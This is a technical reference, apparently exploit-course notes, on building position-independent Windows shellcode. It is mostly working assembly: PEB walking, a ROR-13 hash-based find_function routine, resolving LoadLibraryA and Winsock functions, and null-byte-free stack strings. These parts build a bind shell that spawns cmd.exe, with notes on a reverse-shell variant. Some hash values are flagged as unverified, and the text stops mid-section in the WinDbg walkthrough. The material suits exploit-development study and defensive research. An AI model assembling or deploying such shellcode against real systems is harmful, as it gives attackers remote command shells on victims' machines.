# API Resolution — Complete Workflow from PEB to Function Call

## Table of Contents

1. [The Complete Bootstrap Sequence](#the-complete-bootstrap-sequence)
2. [Position-Independent Function Pointer Storage](#position-independent-function-pointer-storage)
3. [The Call/Pop Thunk](#the-callpop-thunk)
4. [Resolving Kernel32 Symbols](#resolving-kernel32-symbols)
5. [Loading ws2_32.dll and Resolving Socket Functions](#loading-ws2_32dll)
6. [Stack String Construction](#stack-string-construction)
7. [Calling Resolved Functions](#calling-resolved-functions)
8. [Complete Function Pointer Slot Table](#complete-function-pointer-slot-table)
9. [x64 Differences](#x64-differences)
10. [WinDbg Verification](#windbg-verification)
11. [Common Mistakes](#common-mistakes)

---

## The Complete Bootstrap Sequence

API resolution is the bridge between position-independent shellcode and callable Windows functions. The sequence from first instruction to first `CALL [function_pointer]` has seven distinct phases:

```
Phase 1: PEB Access
  FS:[0x30] → PEB base address
  (FS segment register always points to TEB; PEB pointer at TEB+0x30)

Phase 2: Module List Access
  PEB + 0x0C → PEB_LDR_DATA base address
  PEB_LDR_DATA + 0x14 → InInitializationOrderModuleList.Flink
  (first entry is ntdll; second entry is kernel32 on XP/Win7)

Phase 3: kernel32 Base Address
  Walk InInitializationOrderModuleList until kernel32 is found
  LDR_DATA_TABLE_ENTRY + 0x08 → DllBase (actual load address)
  (See PEB_Walking.md for the complete walking implementation)

Phase 4: Export Directory Parsing
  DllBase + [DllBase + 0x3C] + 0x78 → export directory RVA
  Parse AddressOfNames / AddressOfNameOrdinals / AddressOfFunctions
  (See IMAGE_EXPORT_DIRECTORY.md for the full parser)

Phase 5: Bootstrap Resolution
  find_function(kernel32_base, ROR13("LoadLibraryA"))  → [ebp+0x08]
  find_function(kernel32_base, ROR13("GetProcAddress")) → [ebp+0x0C]
  find_function(kernel32_base, ROR13("TerminateProcess")) → [ebp+0x10]

Phase 6: Additional DLL Loading
  CALL [ebp+0x08] with arg "ws2_32.dll" → ws2_32 base
  Parse ws2_32 exports with find_function
  find_function(ws2_32_base, ROR13("WSAStartup"))  → [ebp+0x14]
  find_function(ws2_32_base, ROR13("WSASocketA"))  → [ebp+0x18]
  ... (all needed socket functions)

Phase 7: Shellcode Payload Execution
  CALL [ebp+0x14]  ; WSAStartup(0x0202, &wsadata)
  CALL [ebp+0x18]  ; WSASocketA(AF_INET, SOCK_STREAM, 0, NULL, 0, 0)
  ...
```

### Why This Order Is Mandatory

The order is constrained by dependencies:

- `find_function` requires a module base → kernel32 base from PEB walk first
- `LoadLibraryA` must be resolved before loading ws2_32 → kernel32 resolution first
- Socket functions require ws2_32 to be loaded → `LoadLibraryA` call first
- `WSAStartup` must succeed before any socket operation → called before `WSASocketA`

No shortcuts are possible without external information (hardcoded addresses, import address table, etc.).

---

## Position-Independent Function Pointer Storage

### The Problem

Shellcode has no global data section, no import address table, no named variables. After resolving function addresses, the shellcode must store them somewhere accessible for later `CALL` instructions. The solution is the EBP frame technique: a block of stack memory used as a function pointer table, indexed by EBP-relative offsets.

### Why EBP Instead of ESP

`ESP` changes constantly during function calls (arguments pushed, stack allocated, return addresses pushed). Using ESP-relative storage for function pointers requires tracking every push and pop to maintain consistent offsets — error-prone and fragile.

`EBP` is stable: once set to a fixed point on the stack, it does not change during the shellcode's execution (assuming EBP is not used for any other purpose). `[EBP + constant]` always refers to the same stack location regardless of what push/pop/call activity has occurred since EBP was established.

### Establishing the EBP Frame

```nasm
; ============================================================
; Shellcode entry point — establish function pointer frame
; ============================================================
shellcode_entry:
    ; Preserve caller state (important for injected shellcode)
    pushad                          ; save EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI
    pushfd                          ; save EFLAGS

    ; Align stack to 4-byte boundary (should already be, but defensive)
    and  esp, 0xFFFFFFF8            ; align to 8 bytes (optional, helps with
                                    ; functions that check alignment)

    ; Establish EBP frame for function pointer table
    ; Method A: use current ESP as frame pointer (common approach)
    mov  ebp, esp
    sub  esp, 0x50                  ; reserve 0x50 bytes = 20 slots × 4 bytes each
                                    ; [ebp-0x04] to [ebp-0x50]

    ; Method B: use positive offsets above EBP (OSED standard)
    ; Here EBP points to the TOP of the frame (before sub esp):
    ;   push ebp         ← EBP is saved on stack
    ;   mov ebp, esp     ← EBP now = ESP (pointing at saved EBP)
    ;   sub esp, 0x50    ← allocate below EBP
    ; With this layout:
    ;   [ebp+0x00] = saved EBP (from pushad)
    ;   [ebp+0x04] = first function pointer slot
    ;   [ebp+0x08] = second function pointer slot
    ;   ...

    ; ---- OSED Standard Layout (positive offsets from EBP) ----
    ; The EBP register is set BEFORE the allocation:
    ;   pushad
    ;   pushfd
    ;   call  get_pc           ; call/pop to get EIP-relative value
    ;   get_pc: pop ebp        ; EBP = address of this instruction
    ;   Or simpler:
    ;   mov ebp, esp           ; EBP = current stack pointer
    ;   sub esp, 0x60          ; allocate 96 bytes below
    ;
    ; Slots are then at [ebp-0x04], [ebp-0x08], etc.
    ; OSED shellcode typically uses:
    ;   [ebp-0x04] = find_function address (obtained via call/pop)
    ;   [ebp-0x08] = LoadLibraryA
    ;   [ebp-0x0C] = GetProcAddress (optional)
    ;   [ebp-0x10] = TerminateProcess / ExitProcess
    ;   [ebp-0x14] = WSAStartup
    ;   ... and so on

    ; In this reference, we use NEGATIVE offsets from EBP:
    mov  ebp, esp                   ; ebp = stack pointer (AFTER pushad/pushfd)
    sub  esp, 0x60                  ; allocate function pointer table space

    ; Zero out the allocated space (optional, helps debugging)
    ; (do NOT zero if code needs to remain position-independent and null-free)
```

### Stack Frame Diagram

```
High addresses (pre-shellcode stack)
  ...
  [ebp + 0x08]  = EFLAGS (from pushfd)
  [ebp + 0x04]  = EDI (from pushad, lowest reg pushed last)
  [ebp + 0x00]  = ESI (from pushad)
  ... (rest of pushad saves)
  [ebp - 0x04]  = first function pointer slot  ← [ebp-0x04] = find_function
  [ebp - 0x08]  = second slot                  ← [ebp-0x08] = LoadLibraryA
  [ebp - 0x0C]  = third slot                   ← [ebp-0x0C] = GetProcAddress
  [ebp - 0x10]  = fourth slot                  ← [ebp-0x10] = TerminateProcess
  [ebp - 0x14]  = fifth slot                   ← [ebp-0x14] = WSAStartup
  [ebp - 0x18]  = sixth slot                   ← [ebp-0x18] = WSASocketA
  [ebp - 0x1C]  = seventh slot                 ← [ebp-0x1C] = bind
  [ebp - 0x20]  = eighth slot                  ← [ebp-0x20] = listen
  [ebp - 0x24]  = ninth slot                   ← [ebp-0x24] = accept
  [ebp - 0x28]  = tenth slot                   ← [ebp-0x28] = CreateProcessA
  [ebp - 0x2C]  = eleventh slot                ← [ebp-0x2C] = GetLastError
  ...
Low addresses (growing down)
  ESP → (current stack, active use)
```

---

## The Call/Pop Thunk

### Purpose

The call/pop technique provides the runtime address of `find_function` without any absolute address in the shellcode. This is required because shellcode is position-independent — it can be loaded at any address, and no instruction may contain an absolute VA to another part of the shellcode.

### Mechanism

The `CALL` instruction pushes the address of the next instruction (the return address) onto the stack, then jumps to the target. If the code immediately after `CALL` is `find_function`, then the address pushed is the address of `find_function`.

```
Memory layout at runtime (example, addresses arbitrary):
  
  0x00123450:  JMP   find_function_shorten_bnc   ← executed first
  ...
  0x0012345A:  find_function_ret:
  0x0012345A:  POP ESI                           ← ESI = 0x0012345F (after pop)
  0x0012345B:  MOV [EBP-0x04], ESI
  0x0012345F:  JMP resolve_symbols_kernel32
  ...
  0x00123470:  find_function_shorten_bnc:
  0x00123470:  CALL  find_function_ret            ← pushes 0x00123475 onto stack
                                                   ← jumps to find_function_ret
  0x00123475:  find_function:                     ← this address is now on stack
  0x00123475:  PUSHAD                             ← find_function starts here
  ...
```

The sequence of events:
1. `JMP find_function_shorten_bnc` — skip over `find_function_ret` and `find_function`
2. `CALL find_function_ret` — pushes address of `find_function` onto stack, then jumps to `find_function_ret`
3. `POP ESI` — ESI = address of `find_function`
4. `MOV [EBP-0x04], ESI` — store `find_function` address in slot 0 of function pointer table
5. `JMP resolve_symbols_kernel32` — proceed to resolution

### Complete Assembly

```nasm
; ============================================================
; Call/pop thunk for position-independent find_function access
; ============================================================

    ; ---- Entry: jump over find_function_ret and find_function body ----
    jmp   get_find_function_ptr

; ---- find_function_ret: executed after CALL, retrieves find_function address ----
find_function_ret:
    pop   esi                        ; ESI = runtime address of find_function
                                     ; (= address of find_function label below)
    mov   [ebp - 0x04], esi          ; store in function pointer table slot 0
    jmp   resolve_symbols_kernel32   ; proceed to symbol resolution

; ---- get_find_function_ptr: the CALL instruction ----
get_find_function_ptr:
    call  find_function_ret          ; push address of next instruction (find_function)
                                     ; then jump to find_function_ret
                                     ; CRITICAL: find_function MUST immediately follow CALL

; ============================================================
; find_function
; MUST BE IMMEDIATELY AFTER THE CALL INSTRUCTION ABOVE
; (no bytes between the CALL and the PUSHAD)
;
; Input:  [ESP+0x04] = module base address
;         [ESP+0x08] = ROR-13 target hash
; Output: EAX = function VA (0 if not found)
; ============================================================
find_function:
    pushad                           ; save caller registers

    ; Load arguments from stack (pushed by caller before CALL)
    ; After pushad: [esp+0x20] = return addr, [esp+0x24] = arg1, [esp+0x28] = arg2
    mov   ebx, [esp + 0x24]         ; ebx = module base address
    mov   ecx, [esp + 0x28]         ; ecx = target ROR-13 hash

    ; Navigate to export directory
    mov   eax, [ebx + 0x3C]         ; e_lfanew
    mov   eax, [ebx + eax + 0x78]   ; export dir RVA
    add   eax, ebx                   ; export dir VA → EAX

    ; Load export directory fields
    push  eax                        ; save export dir VA on stack
    mov   ecx, [eax + 0x18]         ; ecx = NumberOfNames
    mov   edi, [eax + 0x20]
    add   edi, ebx                   ; edi = AddressOfNames VA

find_function_loop:
    test  ecx, ecx
    jz    find_function_not_found
    dec   ecx

    ; Load name RVA and convert to VA
    mov   esi, [edi + ecx*4]        ; esi = name RVA
    add   esi, ebx                   ; esi = name VA (string pointer)

    ; Hash the name with ROR-13
    push  ecx                        ; save loop counter
    push  edi                        ; save names table pointer
    xor   eax, eax                   ; clear hash accumulator
    xor   edx, edx                   ; edx = running hash

compute_hash:
    movzx eax, byte ptr [esi]
    test  al, al
    jz    hash_done
    ror   edx, 0x0D                  ; ROR-13
    add   edx, eax
    inc   esi
    jmp   compute_hash

hash_done:
    ; Stack: [esp+00]=saved edi, [esp+04]=saved ecx, [esp+08]=export dir VA,
    ;        then pushad frame (32 bytes), then return addr, then args
    ; Target hash is [esp+08+20+04+08] from here? Recompute:
    ; After two pushes (ECX and EDI): added 8 bytes to stack since find_function body
    ; pushad added 32 bytes, plus our "push eax" (export dir) = 36 bytes
    ; return addr = 4 bytes, arg1 = 4 bytes, arg2 = 4 bytes
    ; target hash (arg2) at: [esp + 8 (local pushes) + 36 (pushad+exportdir) + 4 (retaddr) + 4 (arg1)]
    ;                       = [esp + 52] = [esp + 0x34]
    cmp   edx, [esp + 0x34]         ; computed hash == target hash?
    jnz   no_hash_match

    ; Match found
    pop   edi                        ; restore names table pointer
    pop   ecx                        ; restore loop counter

    ; Load export dir VA
    mov   eax, [esp]                 ; eax = export dir VA (our push eax)

    ; Get func_index from ordinal table
    mov   esi, [eax + 0x24]
    add   esi, ebx                   ; esi = AddressOfNameOrdinals VA
    movzx eax, word ptr [esi + ecx*2]; eax = func_index (WORD)

    ; Get func_rva from EAT
    mov   esi, [esp]                 ; esi = export dir VA (re-read)
    mov   esi, [esi + 0x1C]
    add   esi, ebx                   ; esi = AddressOfFunctions VA
    mov   eax, [esi + eax*4]        ; eax = func_rva

    ; Convert to VA
    add   eax, ebx                   ; eax = func_VA  ← result

    ; Store result in pushad frame's EAX slot
    ; Stack: [esp+0x00]=export dir, then pushad (32 bytes), EAX is at pushad+28
    mov   [esp + 0x1C], eax         ; pushad EAX slot: 0x1C above our extra push
    add   esp, 4                     ; remove export dir push
    popad                            ; restore all; EAX = func_VA
    ret   0x08                       ; stdcall: clean 2 args (8 bytes) from stack

no_hash_match:
    pop   edi
    pop   ecx
    jmp   find_function_loop

find_function_not_found:
    add   esp, 4                     ; remove export dir push
    xor   eax, eax
    mov   [esp + 0x1C], eax         ; set return EAX = 0
    popad
    ret   0x08
```

---

## Resolving Kernel32 Symbols

After the call/pop thunk stores `find_function`'s address in `[ebp-0x04]`, the shellcode resolves the minimum set of kernel32 functions needed to load additional DLLs.

```nasm
; ============================================================
; resolve_symbols_kernel32
; EBX = kernel32.dll base (set by PEB walk, must be done before this)
; ============================================================
resolve_symbols_kernel32:

    ; ---- Resolve LoadLibraryA ----
    push  0xEC0E4E8E                 ; ROR-13 hash of "LoadLibraryA"
    push  ebx                        ; kernel32 base
    call  dword ptr [ebp - 0x04]     ; call find_function
    mov   [ebp - 0x08], eax          ; save LoadLibraryA pointer

    ; ---- Resolve GetProcAddress ----
    push  0x7C0DFCAA                 ; ROR-13 hash of "GetProcAddress"
    push  ebx
    call  dword ptr [ebp - 0x04]
    mov   [ebp - 0x0C], eax          ; save GetProcAddress pointer

    ; ---- Resolve TerminateProcess ----
    push  0x78B5B983                 ; ROR-13 hash of "TerminateProcess"
    push  ebx
    call  dword ptr [ebp - 0x04]
    mov   [ebp - 0x10], eax          ; save TerminateProcess pointer

    ; ---- Resolve VirtualAlloc (if needed for later use) ----
    push  0x91AFCA54                 ; ROR-13 hash of "VirtualAlloc"
    push  ebx
    call  dword ptr [ebp - 0x04]
    mov   [ebp - 0x34], eax          ; save VirtualAlloc pointer
                                     ; (slot number depends on full table layout)

    ; ---- Resolve CreateProcessA ----
    push  0x16B3FE72                 ; ROR-13 hash of "CreateProcessA"
    push  ebx
    call  dword ptr [ebp - 0x04]
    mov   [ebp - 0x28], eax          ; save CreateProcessA pointer

    ; (continue for any other kernel32 functions needed)
```

### Hash Values for Common kernel32 Exports

See `Documentation/Shellcode/Hash_Algorithms.md` for the complete hash table and the Python script to recompute/verify values.

---

## Loading ws2_32.dll

After resolving `LoadLibraryA` from kernel32, the shellcode can load additional DLLs. The process for ws2_32.dll:

```nasm
; ============================================================
; load_ws2_32
; Push "ws2_32.dll\0" string onto stack as argument to LoadLibraryA
; ============================================================
load_ws2_32:

    ; "ws2_32.dll" is 10 chars + null = 11 bytes
    ; Push in reverse dword order (little-endian, right to left)
    ; Break into dwords from the end:
    ;
    ;   Position: 0  1  2  3  4  5  6  7  8  9  10
    ;   Chars:    w  s  2  _  3  2  .  d  l  l  \0
    ;   Hex:     77 73 32 5F 33 32 2E 64 6C 6C 00
    ;
    ; Group into dwords (from right, 4 bytes at a time):
    ;   dword 3 (rightmost in string, leftmost in memory push):
    ;     bytes [10..7] = 00 6C 6C 64 = "\0lld" → push 0x00646C6C
    ;     ← contains 0x00 null byte! Bad for null-byte-free shellcode.
    ;
    ; Null-byte-free alternative using XOR encoding:
    ;   Instead of pushing 0x00646C6C, use arithmetic:
    ;     push 0x01656D6D    ; "emm\x01" (0x00646C6C + 0x01010101)
    ;     sub  dword ptr [esp], 0x01010101  ; gives 0x00646C6C on stack
    ;     (adjust for actual bytes needed)
    ;
    ; Cleanest approach: pad to 12 bytes (3 dwords) with null at end:
    ;   "ws2_32.dl" + "l\0\0\0" → 12 bytes, 3 dwords
    ;
    ;   dword 1 (high, pushed first): "ws2_" = 77 73 32 5F → 0x5F327377
    ;                                  little-endian: 77 73 32 5F → DWORD = 0x5F327377
    ;   dword 2: "32.d" = 33 32 2E 64 → 0x642E3233
    ;   dword 3: "ll\0\0" = 6C 6C 00 00 → 0x00006C6C  ← null bytes again
    ;
    ; Best approach for null-byte-free shellcode:
    ; Push a non-null sentinel, then fix it:
    xor   eax, eax                   ; eax = 0 (for null terminators)

    ; Push "ws2_32.dll" + null termination
    ; Use two-byte pushes or byte-at-a-time construction if null is an issue
    ; Practical: use sub-based encoding

    ; Push padding if needed to align dword boundary
    push  eax                        ; push 0x00000000 (acts as null terminator)
                                     ; This push contains null — OK IF shellcode
                                     ; can tolerate null bytes (e.g., if transmitted
                                     ; over a channel that does not strip nulls,
                                     ; or if encoder handles it separately).

    ; Push "ll\0" then ".d" then "32.d" approach:
    ; Actually simplest: use the stack incrementally

    ; ---- Alternative: build with MOV byte approach (no push needed) ----
    ; SUB ESP, 12 to allocate space, then write bytes:
    sub   esp, 0x10                  ; 16 bytes: 10 for string + null + padding
    mov   byte ptr [esp + 0x00], 'w' ; = 0x77
    mov   byte ptr [esp + 0x01], 's' ; = 0x73
    mov   byte ptr [esp + 0x02], '2' ; = 0x32
    mov   byte ptr [esp + 0x03], '_' ; = 0x5F
    mov   byte ptr [esp + 0x04], '3' ; = 0x33
    mov   byte ptr [esp + 0x05], '2' ; = 0x32
    mov   byte ptr [esp + 0x06], '.' ; = 0x2E
    mov   byte ptr [esp + 0x07], 'd' ; = 0x64
    mov   byte ptr [esp + 0x08], 'l' ; = 0x6C
    mov   byte ptr [esp + 0x09], 'l' ; = 0x6C
    mov   byte ptr [esp + 0x0A], 0x00; null terminator — embedded null!
    ; ← This approach embeds 0x00 bytes as immediates, which are in the shellcode
    ;    binary and will be stripped if shellcode is passed through null-terminator-
    ;    sensitive channels (strcpy, printf format, etc.)

    ; ---- For null-byte-free shellcode: use register XOR ----
    ; (see Stack String Construction section below for complete examples)
    push  esp                        ; arg: lpLibFileName = pointer to string
    call  dword ptr [ebp - 0x08]     ; LoadLibraryA("ws2_32.dll")
    mov   esi, eax                   ; ESI = ws2_32.dll base address
    add   esp, 0x10                  ; clean up string allocation
```

---

## Stack String Construction

Building ASCII strings on the stack without embedding null bytes is a core shellcode skill. Several techniques exist with different tradeoffs.

### Technique 1: Reverse DWORD Pushes (Simple, Often Has Nulls)

```nasm
; Build "cmd\0" (4 bytes = 1 dword):
; "cmd\0" in little-endian = 0x00646D63
push 0x00646D63        ; ← contains null byte at highest position
                        ; ONLY safe if shellcode tolerates null bytes
```

### Technique 2: XOR with Known Value to Avoid Nulls

```nasm
; Build "cmd\0" without null bytes in the instruction:
; Target: 0x00646D63
; Choose XOR key so that XOR(target, key) has no null bytes:
; 0x00646D63 XOR 0x11111111 = 0x11755C72 (no nulls)
push 0x11755C72        ; push obfuscated value (no nulls in this dword)
xor  dword ptr [esp], 0x11111111  ; XOR restores original "cmd\0"
                                   ; Note: the XOR instruction itself has no null bytes
                                   ; because 0x11111111 has none.
```

General method:
1. Start with the target dword value
2. XOR with a key that has no null bytes (e.g., `0x01010101`, `0x11111111`, `0xDEADBEEF`)
3. Verify the result (target XOR key) has no null bytes; adjust key if needed
4. Push the obfuscated value
5. XOR the top of stack with the key to restore

### Technique 3: SUB/ADD to Avoid Null Push

```nasm
; Build "cmd\0" = 0x00646D63 without null bytes:
push 0x01656E64        ; "en\x01" (0x00646D63 + 0x01010101)
                        ; verify: 0x01 65 6E 64 — no null bytes
sub  dword ptr [esp], 0x01010101  ; restore: 0x01656E64 - 0x01010101 = 0x00646D63
```

### Technique 4: Character-by-Character with XOR EAX

```nasm
; Build "ws2_32.dll\0" null-byte-free using LODSB-style construction:
; Method: write bytes relative to ESP using instructions that don't embed nulls

xor  eax, eax                    ; eax = 0
sub  esp, 0x10                   ; allocate space (no nulls in 0x10 = 16)

; Write each character using add/mov with non-null values:
push 0x10                        ; eax will hold character values
pop  ecx
; Alternative: just use char literals which are all > 0 except null terminator

; All non-null characters can be pushed as byte immediates:
; But "mov byte [esp+N], imm8" with imm8=0x77 ('w') -- the 0x77 is fine
; The issue is the null terminator byte at position 10

; Cleanest complete solution using LODSB alternative:
; Build the string in a register using shifts:

; "ws2_32.dl" = 9 bytes (all non-null)
; Null at position 10: handle by writing XOR result

lea  edi, [esp]                  ; edi = destination

; Write non-null bytes directly:
mov  byte ptr [edi + 0], 0x77    ; 'w'
mov  byte ptr [edi + 1], 0x73    ; 's'
mov  byte ptr [edi + 2], 0x32    ; '2'
mov  byte ptr [edi + 3], 0x5F    ; '_'
mov  byte ptr [edi + 4], 0x33    ; '3'
mov  byte ptr [edi + 5], 0x32    ; '2'
mov  byte ptr [edi + 6], 0x2E    ; '.'
mov  byte ptr [edi + 7], 0x64    ; 'd'
mov  byte ptr [edi + 8], 0x6C    ; 'l'
mov  byte ptr [edi + 9], 0x6C    ; 'l'

; Null terminator: use XOR EAX (which is 0) instead of mov imm 0:
xor  eax, eax                    ; eax = 0 (2 bytes: 0x31 0xC0 — no null!)
mov  byte ptr [edi + 10], al     ; write 0x00 from AL  (3 bytes: 0x88 0x47 0x0A)
                                  ; ← The byte 0x00 IS in the shellcode here
                                  ; 0x88 0x47 0x0A — no nulls in the encoding!
                                  ; (mov [edi+10], al has opcode bytes 88 47 0A)

; Result: "ws2_32.dll\0" on stack starting at ESP, no null bytes in the
; shellcode's binary except as the actual string content written at runtime.
```

### Technique Comparison

```
Technique                     Null bytes in    Stack cleanup   Code size
                              shellcode?       needed?
-----------------------------  ---------------  --------------  ---------
Direct push with null          YES              Simple (add esp) Smallest
XOR key with push              NO               Simple          +8 bytes/dword
SUB-based                      NO               Simple          +4 bytes/dword
Byte-at-a-time with XOR EAX    NO (for content) None (in-place) Largest
LODSB from encoded blob        NO               None            Medium
```

For bind shell shellcode targeting standard exploitation: byte-at-a-time with `MOV BYTE [mem], reg` is most reliable. The null byte `0x00` appears in the shellcode binary only as string content written at runtime, not as instruction operands.

---

## Calling Resolved Functions

### The stdcall Convention (Windows API Standard)

Nearly all Win32 API functions use `stdcall`: arguments pushed right-to-left, callee cleans the stack. The shellcode pushes arguments in reverse order, calls the function pointer, and does NOT need to clean the stack after the call.

```nasm
; Call LoadLibraryA(lpLibFileName)
; Prototype: HMODULE WINAPI LoadLibraryA(LPCSTR lpLibFileName)
; stdcall: one argument, function cleans it

push  esp_value_pointing_to_dll_name_string  ; lpLibFileName
; or:
push  esi                    ; if ESI = pointer to "ws2_32.dll"
call  dword ptr [ebp - 0x08] ; LoadLibraryA
; After return: stack is already clean (LoadLibraryA removes its one arg)
; EAX = HMODULE (module base address) or 0 on failure
mov   esi, eax               ; save ws2_32.dll base
```

### The cdecl Convention (C Runtime Functions)

Some functions (particularly CRT functions and some older Win32 functions) use `cdecl`: caller cleans the stack.

```nasm
; Call with cdecl cleanup:
push  arg2
push  arg1
call  dword ptr [ebp - 0xXX]
add   esp, 0x08              ; caller cleans: 2 args × 4 bytes = 8 bytes
```

All socket functions in ws2_32 use `stdcall` (they are Win32 functions). `WinExec` in kernel32 is `stdcall`. For any Microsoft-documented Win32 function, stdcall is the default.

### Full ws2_32 Resolution and WSAStartup Call

```nasm
; ============================================================
; After load_ws2_32 sets ESI = ws2_32.dll base
; ============================================================
resolve_ws2_32:
    ; ---- WSAStartup ----
    push  0x006B8029                 ; ROR-13 hash of "WSAStartup"
                                     ; NOTE: high byte 0x00 — null byte in push!
                                     ; Encode: push (0x006B8029 ^ 0x11111111) = 0x117A9138
                                     ;         xor dword ptr [esp], 0x11111111
                                     ; Or accept and use encoder for whole shellcode.
    push  esi                        ; ws2_32 base
    call  dword ptr [ebp - 0x04]     ; find_function → WSAStartup VA
    mov   [ebp - 0x14], eax

    ; ---- WSASocketA ----
    push  0xE0DF0FEA                 ; ROR-13 hash of "WSASocketA"
    push  esi
    call  dword ptr [ebp - 0x04]
    mov   [ebp - 0x18], eax

    ; ---- bind ----
    push  0x60499AFC                 ; ROR-13 hash of "bind" (verify with script)
    push  esi
    call  dword ptr [ebp - 0x04]
    mov   [ebp - 0x1C], eax

    ; ---- listen ----
    push  0xFF38E9B7                 ; ROR-13 hash of "listen" (verify)
    push  esi
    call  dword ptr [ebp - 0x04]
    mov   [ebp - 0x20], eax

    ; ---- accept ----
    push  0xE13BEC74                 ; ROR-13 hash of "accept" (verify)
    push  esi
    call  dword ptr [ebp - 0x04]
    mov   [ebp - 0x24], eax

; ---- Call WSAStartup ----
; WSADATA is a 400-byte structure; allocate on stack
call_WSAStartup:
    sub   esp, 0x190                 ; allocate 400 bytes for WSADATA structure
    mov   edi, esp                   ; EDI = pointer to WSADATA

    push  edi                        ; lpWSAData = pointer to our WSADATA buffer
    push  0x0202                     ; wVersionRequested = 2.2 (0x0202)
    call  dword ptr [ebp - 0x14]     ; WSAStartup(0x0202, &wsadata)
    ; stdcall: callee cleans 2 args
    ; EAX = 0 on success
    ; Do NOT add esp after stdcall

; ---- Call WSASocketA ----
call_WSASocketA:
    push  0x00                       ; dwFlags = 0
    push  0x00                       ; g = 0 (no group)
    push  0x00                       ; lpProtocolInfo = NULL
    push  0x00                       ; protocol = 0 (auto)
    push  0x01                       ; type = SOCK_STREAM
    push  0x02                       ; af = AF_INET
    call  dword ptr [ebp - 0x18]     ; WSASocketA(AF_INET, SOCK_STREAM, 0, NULL, 0, 0)
    mov   edi, eax                   ; EDI = socket handle (SOCKET)
```

---

## Complete Function Pointer Slot Table

The following is the canonical slot layout for a bind shell shellcode. Every slot uses a negative offset from EBP.

```
Slot        Offset      Function            Module      Notes
----        ------      --------            ------      -----
Slot 0      [ebp-0x04]  find_function       (internal)  Obtained via call/pop thunk
Slot 1      [ebp-0x08]  LoadLibraryA        kernel32    Bootstrap function 1
Slot 2      [ebp-0x0C]  GetProcAddress      kernel32    Bootstrap function 2 (optional)
Slot 3      [ebp-0x10]  TerminateProcess    kernel32    Cleanup function
Slot 4      [ebp-0x14]  WSAStartup          ws2_32      Socket init
Slot 5      [ebp-0x18]  WSASocketA          ws2_32      Create socket
Slot 6      [ebp-0x1C]  bind                ws2_32      Bind socket to port
Slot 7      [ebp-0x20]  listen              ws2_32      Listen for connections
Slot 8      [ebp-0x24]  accept              ws2_32      Accept connection → new socket
Slot 9      [ebp-0x28]  CreateProcessA      kernel32    Spawn cmd.exe
Slot 10     [ebp-0x2C]  GetLastError        kernel32    Debug only; remove from final
Slot 11     [ebp-0x30]  SetHandleInformation kernel32  For handle inheritance
Slot 12     [ebp-0x34]  VirtualAlloc        kernel32    If staging second stage
Slot 13     [ebp-0x38]  CloseHandle         kernel32    Cleanup
Slot 14     [ebp-0x3C]  (reserved/ws2_32)   ws2_32      send, recv, or closesocket
Slot 15     [ebp-0x40]  (reserved)          -           WSAConnect (for reverse shell)
```

For a reverse shell, replace bind/listen/accept with connect (and potentially WSAConnect):

```
Slot 6      [ebp-0x1C]  connect             ws2_32      (replaces bind in reverse shell)
; listen and accept slots unused/repurposed
```

### Stack Allocation Sizing

```nasm
; For the table above (16 slots):
sub  esp, 0x40          ; 64 bytes = 16 slots × 4 bytes each
                         ; [ebp-0x04] to [ebp-0x40]

; Always allocate enough space before the first write:
; If in doubt, allocate more (0x60 or 0x80) — unused space is harmless
```

---

## x64 Differences

Writing API resolution shellcode for 64-bit Windows requires changes at every layer.

### PEB Access

```nasm
; x86: PEB at FS:[0x30]
mov  eax, dword ptr fs:[0x30]      ; x86

; x64: PEB at GS:[0x60]
mov  rax, qword ptr gs:[0x60]      ; x64
```

### No pushad / popad

These instructions do not exist in 64-bit mode. Save registers individually:

```nasm
; x64 prologue (saves all caller-saved and some callee-saved registers):
push rbx
push rbp
push rdi
push rsi
push r12
push r13
push r14
push r15
```

### Function Pointer Table Layout

In x64, pointers are 8 bytes (QWORD). Slots are 8 bytes apart:

```nasm
sub  rsp, 0x80         ; 128 bytes = 16 slots × 8 bytes each
mov  rbp, rsp

; Slots:
; [rbp+0x00] = find_function
; [rbp+0x08] = LoadLibraryA
; [rbp+0x10] = GetProcAddress
; ... etc. (positive offsets from RBP for x64 OSED convention)
```

### The 32-Byte Shadow Space

Every Win64 API call requires the caller to allocate 32 bytes of "shadow space" (also called "home space" or "register parameter area") above the return address. This space is reserved for the callee to optionally spill its register arguments. It is not optional — violating it causes crashes in functions that use it.

```nasm
; x64 stdcall call pattern:
sub  rsp, 0x20          ; allocate 32 bytes shadow space
; (stack must be 16-byte aligned before the CALL instruction,
;  after the CALL pushes return address it will be 8-byte off 16,
;  which is correct for the callee's entry)
call dword ptr [rbp + 0x08]   ; CALL LoadLibraryA (or other)
add  rsp, 0x20          ; MUST clean shadow space after return
; (stdcall cleaners only clean their own declared args, NOT shadow space
;  which is the caller's responsibility in Win64 — different from Win32!)
```

Note: In Win64, the calling convention is unified (Microsoft x64 ABI). There is no "cdecl vs stdcall" distinction — all functions use the same convention. Shadow space is always the caller's responsibility.

### Register Arguments

Win64 passes first four arguments in registers:

```
Argument 1 → RCX
Argument 2 → RDX
Argument 3 → R8
Argument 4 → R9
Argument 5+ → pushed on stack (above shadow space)
```

```nasm
; x64: Call LoadLibraryA("ws2_32.dll")
lea  rcx, [rip + dll_name_offset]  ; RCX = pointer to "ws2_32.dll" (rip-relative)
; OR:
lea  rcx, [rsp + 0x28]             ; RCX = pointer to string built on stack
sub  rsp, 0x20                     ; shadow space
call qword ptr [rbp + 0x08]        ; LoadLibraryA
add  rsp, 0x20                     ; clean shadow space
; EAX (lower 32 bits of RAX) = module handle, or 0 on failure
mov  r12, rax                      ; save ws2_32 base
```

### x64 PE Navigation

```nasm
; x64: export dir RVA at NT headers + 0x88 (not 0x78 as in x86)
mov  eax, [rbx + 0x3C]             ; e_lfanew (still 32-bit value)
mov  edx, [rbx + rax + 0x88]       ; export dir RVA (64-bit optional header offset)
                                    ; 0x18 (OptHdr start) + 0x70 (DataDir in x64 OptHdr)
                                    ; = 0x88
add  rdx, rbx                      ; export dir VA (64-bit add)
```

---

## WinDbg Verification

After each phase of resolution, WinDbg allows verification that the correct values were obtained.

### Step 1: Verify PEB Walk and kernel32 Base

```
; At breakpoint after PEB walk, before export resolution
; EBX should hold kernel32 base

0:000> ln ebx
Exact matches:
    kernel32 (<no symbol>)
    7c800000   KERNEL32   ← confirms EBX = kernel32 base
```

If `ln ebx` does not return a module name, EBX does not point to a valid module base. Check the PEB walking code.

### Step 2: Single-Step Through Export Resolution

```
; Set breakpoint at find_function entry
0:000> bp find_function
0:000> g
Breakpoint 0 hit
find_function:
0:000> t              ; step one instruction at a time
```

After each iteration:
```
; Check what name is being hashed:
